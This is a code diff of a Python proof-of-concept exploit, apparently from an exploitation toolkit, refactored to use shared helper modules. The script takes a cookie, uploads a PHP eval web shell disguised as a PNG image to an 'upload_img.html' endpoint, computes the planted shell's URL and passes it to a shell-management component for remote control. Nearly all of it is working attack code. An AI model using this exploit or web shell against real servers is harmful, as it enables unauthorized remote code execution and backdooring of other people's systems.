@@ -1,17 +1,17 @@
 import requests
 
-from plugin.shell.shell_manage import post_shell_manage
+from plugin.component.shell import shell
+from plugin.component.check import url_check
+
 
 def poc(url):
     try:
-        if not url.endswith("upload_img.html"):
-            print("[*] Please make sure the url end with 'upload_img.html'")
-            exit()
-        proxy = {'http': '127.0.0.1:8080'}
+        url_check(url, "upload_img.html")
         upload_url = url + '?is_h5=2'
         cookie = raw_input("[*] Please input cookie:")
-        password = raw_input("[*] Please enter the shell-password:")
-        phpshell = "<?php eval($_POST['%s']);?>" % password
+        shell_password = raw_input("[*] Please enter the shell-password:")
+        shell_content = "<?php eval($_POST['%s']);?>" % shell_password
+
         header = {
             'User-Agent':
             'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
@@ -31,15 +31,15 @@ def poc(url):
             'id': (None, 'WU_FILE_4'),
             'name': (None, 'logo.png'),
             'type': (None, 'image/png'),
-            'file': ('test.php', phpshell, 'image/png')
+            'file': ('test.php', shell_content, 'image/png')
         }
         r = requests.post(upload_url, headers=header, files=upload_file)
-        shell = url.replace('upload_img.html',
-                            '') + r.json()['data']['img'].replace(
-                                '_s.php', '.php')
+        shell_path = url.replace('upload_img.html',
+                                 '') + r.json()['data']['img'].replace(
+                                     '_s.php', '.php')
+        shell_manage = shell(header, shell_path, shell_password)
+        shell_manage.check()
+        shell_manage.post_manage()
 
-        print("[*] The shell url: " + shell)
-        print("[*] The shell password: " + password)
-        post_shell_manage(shell,password)
     except Exception:
         pass
